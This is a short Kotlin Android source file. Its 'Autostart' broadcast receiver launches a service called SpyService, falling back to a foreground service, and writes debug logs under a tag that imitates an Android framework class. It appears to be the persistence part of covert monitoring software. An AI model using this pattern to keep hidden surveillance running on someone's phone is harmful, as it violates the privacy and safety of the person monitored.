package local.kas.myapplication
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log


class Autostart : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
//        NotificationHelper.instance.notify("${intent.action}")
        val intentService = Intent(context, SpyService::class.java)
        try {
            Log.d("ChoreographerKt", "16")
            context.startService(intentService)
        } catch (e: Exception) {
            Log.d("ChoreographerKt", "19")
            context.startForegroundService(intentService)
        }

    }

}